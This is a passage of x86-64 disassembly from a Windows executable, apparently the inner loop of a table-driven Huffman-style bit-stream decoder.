   14000515e:	0f b6 40 03          	movzbl 0x3(%rax),%eax
   140005162:	41 01 cc             	add    %ecx,%r12d
   140005165:	49 01 c2             	add    %rax,%r10
   140005168:	4c 39 d6             	cmp    %r10,%rsi
   14000516b:	73 d3                	jae    0x140005140
   14000516d:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   140005174:	00 
   140005175:	49 39 c2             	cmp    %rax,%r10
   140005178:	73 40                	jae    0x1400051ba
   14000517a:	48 8b 04 24          	mov    (%rsp),%rax
   14000517e:	44 89 e1             	mov    %r12d,%ecx
   140005181:	48 d3 e0             	shl    %cl,%rax
   140005184:	8b 4c 24 7c          	mov    0x7c(%rsp),%ecx
   140005188:	f7 d9                	neg    %ecx
   14000518a:	48 d3 e8             	shr    %cl,%rax
   14000518d:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   140005191:	0f b6 08             	movzbl (%rax),%ecx
   140005194:	41 88 0a             	mov    %cl,(%r10)
   140005197:	80 78 03 01          	cmpb   $0x1,0x3(%rax)
   14000519b:	0f 84 27 07 00 00    	je     0x1400058c8
   1400051a1:	41 83 fc 3f          	cmp    $0x3f,%r12d
   1400051a5:	77 13                	ja     0x1400051ba
   1400051a7:	0f b6 40 02          	movzbl 0x2(%rax),%eax
   1400051ab:	41 01 c4             	add    %eax,%r12d
   1400051ae:	b8 40 00 00 00       	mov    $0x40,%eax
   1400051b3:	41 39 c4             	cmp    %eax,%r12d
   1400051b6:	44 0f 47 e0          	cmova  %eax,%r12d
   1400051ba:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   1400051c1:	00 
   1400051c2:	48 8d 58 fe          	lea    -0x2(%rax),%rbx
   1400051c6:	41 83 fe 40          	cmp    $0x40,%r14d
   1400051ca:	0f 87 45 01 00 00    	ja     0x140005315
   1400051d0:	44 8b 44 24 7c       	mov    0x7c(%rsp),%r8d
   1400051d5:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   1400051dc:	00 
   1400051dd:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400051e2:	4c 8b 54 24 70       	mov    0x70(%rsp),%r10
   1400051e7:	41 f7 d8             	neg    %r8d
   1400051ea:	41 83 e0 3f          	and    $0x3f,%r8d
   1400051ee:	e9 f2 00 00 00       	jmp    0x1400052e5
   1400051f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400051f8:	48 39 44 24 60       	cmp    %rax,0x60(%rsp)
   1400051fd:	0f 84 6d 06 00 00    	je     0x140005870
   140005203:	44 89 f5             	mov    %r14d,%ebp
   140005206:	48 89 c1             	mov    %rax,%rcx
   140005209:	c1 ed 03             	shr    $0x3,%ebp
   14000520c:	89 ef                	mov    %ebp,%edi
   14000520e:	48 29 f9             	sub    %rdi,%rcx
   140005211:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140005216:	48 39 f9             	cmp    %rdi,%rcx
   140005219:	0f 82 21 03 00 00    	jb     0x140005540
   14000521f:	49 39 f1             	cmp    %rsi,%r9
   140005222:	48 89 c8             	mov    %rcx,%rax
   140005225:	40 0f 92 c7          	setb   %dil
   140005229:	c1 e5 03             	shl    $0x3,%ebp
   14000522c:	41 29 ee             	sub    %ebp,%r14d
   14000522f:	48 8b 29             	mov    (%rcx),%rbp
   140005232:	40 84 ff             	test   %dil,%dil
   140005235:	0f 84 dd 06 00 00    	je     0x140005918
   14000523b:	44 89 f1             	mov    %r14d,%ecx
   14000523e:	48 89 ef             	mov    %rbp,%rdi
   140005241:	48 d3 e7             	shl    %cl,%rdi
   140005244:	44 89 c1             	mov    %r8d,%ecx
   140005247:	48 d3 ef             	shr    %cl,%rdi
   14000524a:	49 8d 0c bb          	lea    (%r11,%rdi,4),%rcx
   14000524e:	0f b7 39             	movzwl (%rcx),%edi
   140005251:	66 41 89 39          	mov    %di,(%r9)
   140005255:	0f b6 79 02          	movzbl 0x2(%rcx),%edi
   140005259:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   14000525d:	41 01 fe             	add    %edi,%r14d
   140005260:	48 89 ef             	mov    %rbp,%rdi
   140005263:	49 01 c9             	add    %rcx,%r9
   140005266:	44 89 f1             	mov    %r14d,%ecx
   140005269:	48 d3 e7             	shl    %cl,%rdi
   14000526c:	44 89 c1             	mov    %r8d,%ecx
   14000526f:	48 d3 ef             	shr    %cl,%rdi
   140005272:	49 8d 0c bb          	lea    (%r11,%rdi,4),%rcx
   140005276:	0f b7 39             	movzwl (%rcx),%edi
   140005279:	66 41 89 39          	mov    %di,(%r9)
   14000527d:	0f b6 79 02          	movzbl 0x2(%rcx),%edi
   140005281:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140005285:	44 01 f7             	add    %r14d,%edi
   140005288:	49 89 ee             	mov    %rbp,%r14
   14000528b:	49 01 c9             	add    %rcx,%r9
   14000528e:	89 f9                	mov    %edi,%ecx
   140005290:	49 d3 e6             	shl    %cl,%r14
   140005293:	44 89 c1             	mov    %r8d,%ecx
   140005296:	49 d3 ee             	shr    %cl,%r14
   140005299:	4b 8d 0c b3          	lea    (%r11,%r14,4),%rcx
   14000529d:	44 0f b7 31          	movzwl (%rcx),%r14d
   1400052a1:	66 45 89 31          	mov    %r14w,(%r9)
   1400052a5:	44 0f b6 71 02       	movzbl 0x2(%rcx),%r14d
   1400052aa:	41 01 fe             	add    %edi,%r14d
   1400052ad:	0f b6 79 03          	movzbl 0x3(%rcx),%edi
   1400052b1:	44 89 f1             	mov    %r14d,%ecx
   1400052b4:	4c 01 cf             	add    %r9,%rdi
   1400052b7:	49 89 e9             	mov    %rbp,%r9
   1400052ba:	49 d3 e1             	shl    %cl,%r9
   1400052bd:	44 89 c1             	mov    %r8d,%ecx
   1400052c0:	49 d3 e9             	shr    %cl,%r9
   1400052c3:	4b 8d 0c 8b          	lea    (%r11,%r9,4),%rcx
   1400052c7:	44 0f b7 09          	movzwl (%rcx),%r9d
   1400052cb:	66 44 89 0f          	mov    %r9w,(%rdi)
   1400052cf:	44 0f b6 49 02       	movzbl 0x2(%rcx),%r9d
   1400052d4:	45 01 ce             	add    %r9d,%r14d
   1400052d7:	44 0f b6 49 03       	movzbl 0x3(%rcx),%r9d
   1400052dc:	49 01 f9             	add    %rdi,%r9
   1400052df:	41 83 fe 40          	cmp    $0x40,%r14d
   1400052e3:	77 2b                	ja     0x140005310
   1400052e5:	4c 39 d0             	cmp    %r10,%rax
   1400052e8:	0f 82 0a ff ff ff    	jb     0x1400051f8
   1400052ee:	44 89 f1             	mov    %r14d,%ecx
   1400052f1:	41 83 e6 07          	and    $0x7,%r14d
   1400052f5:	c1 e9 03             	shr    $0x3,%ecx
   1400052f8:	48 29 c8             	sub    %rcx,%rax
   1400052fb:	49 39 f1             	cmp    %rsi,%r9
   1400052fe:	48 8b 28             	mov    (%rax),%rbp
   140005301:	40 0f 92 c7          	setb   %dil
   140005305:	e9 28 ff ff ff       	jmp    0x140005232
   14000530a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005310:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140005315:	4c 39 cb             	cmp    %r9,%rbx
   140005318:	72 53                	jb     0x14000536d
   14000531a:	44 8b 44 24 7c       	mov    0x7c(%rsp),%r8d
   14000531f:	41 f7 d8             	neg    %r8d
   140005322:	41 83 e0 3f          	and    $0x3f,%r8d
   140005326:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000532d:	00 00 00 00 
   140005331:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140005338:	00 00 00 00 
   14000533c:	0f 1f 40 00          	nopl   0x0(%rax)
   140005340:	44 89 f1             	mov    %r14d,%ecx
   140005343:	48 89 e8             	mov    %rbp,%rax
   140005346:	48 d3 e0             	shl    %cl,%rax
   140005349:	44 89 c1             	mov    %r8d,%ecx
   14000534c:	48 d3 e8             	shr    %cl,%rax
   14000534f:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   140005353:	0f b7 08             	movzwl (%rax),%ecx
   140005356:	66 41 89 09          	mov    %cx,(%r9)
   14000535a:	0f b6 48 02          	movzbl 0x2(%rax),%ecx
   14000535e:	0f b6 40 03          	movzbl 0x3(%rax),%eax
   140005362:	41 01 ce             	add    %ecx,%r14d
   140005365:	49 01 c1             	add    %rax,%r9
   140005368:	4c 39 cb             	cmp    %r9,%rbx
   14000536b:	73 d3                	jae    0x140005340
   14000536d:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140005374:	00 
   140005375:	49 39 c1             	cmp    %rax,%r9
   140005378:	73 3f                	jae    0x1400053b9
   14000537a:	44 89 f1             	mov    %r14d,%ecx
   14000537d:	48 89 e8             	mov    %rbp,%rax
   140005380:	48 d3 e0             	shl    %cl,%rax
   140005383:	8b 4c 24 7c          	mov    0x7c(%rsp),%ecx
   140005387:	f7 d9                	neg    %ecx
   140005389:	48 d3 e8             	shr    %cl,%rax
   14000538c:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   140005390:	0f b6 08             	movzbl (%rax),%ecx
   140005393:	41 88 09             	mov    %cl,(%r9)
   140005396:	80 78 03 01          	cmpb   $0x1,0x3(%rax)
   14000539a:	0f 84 34 05 00 00    	je     0x1400058d4
   1400053a0:	41 83 fe 3f          	cmp    $0x3f,%r14d
   1400053a4:	77 13                	ja     0x1400053b9
   1400053a6:	0f b6 40 02          	movzbl 0x2(%rax),%eax
   1400053aa:	41 01 c6             	add    %eax,%r14d
   1400053ad:	b8 40 00 00 00       	mov    $0x40,%eax
   1400053b2:	41 39 c6             	cmp    %eax,%r14d
   1400053b5:	44 0f 47 f0          	cmova  %eax,%r14d
   1400053b9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
   1400053be:	31 c9                	xor    %ecx,%ecx
   1400053c0:	49 39 c7             	cmp    %rax,%r15
   1400053c3:	0f 84 f2 04 00 00    	je     0x1400058bb
   1400053c9:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   1400053ce:	31 c0                	xor    %eax,%eax
   1400053d0:	48 39 74 24 20       	cmp    %rsi,0x20(%rsp)
   1400053d5:	0f 84 d2 04 00 00    	je     0x1400058ad
   1400053db:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1400053e0:	48 39 74 24 38       	cmp    %rsi,0x38(%rsp)
   1400053e5:	0f 85 fd ee ff ff    	jne    0x1400042e8
   1400053eb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400053f0:	48 39 74 24 60       	cmp    %rsi,0x60(%rsp)
   1400053f5:	0f 85 ed ee ff ff    	jne    0x1400042e8
   1400053fb:	31 d2                	xor    %edx,%edx
   1400053fd:	41 83 fc 40          	cmp    $0x40,%r12d
   140005401:	0f 94 c2             	sete   %dl
   140005404:	21 ca                	and    %ecx,%edx
